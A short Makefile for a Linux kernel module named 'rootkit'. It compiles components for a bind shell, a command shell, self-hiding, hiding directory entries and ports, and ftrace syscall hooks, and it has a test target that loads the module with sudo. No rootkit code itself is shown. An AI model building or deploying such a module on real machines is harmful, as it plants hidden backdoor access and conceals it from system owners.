obj-m += rootkit.o 
rootkit-objs += src/rootkit_example.o src/connector.o src/mods/bindshell.o src/mods/runshell.o src/mods/hideme.o src/mods/hidedent.o src/mods/hideport.o src/hooker/ftrace_helper.o src/hooker/getdents.o src/hooker/tcp_seq_show.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
test:
	sudo dmesg -C
	sudo insmod rootkit_example.ko
	sudo rmmod rootkit_example.ko
	sudo dmesg
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
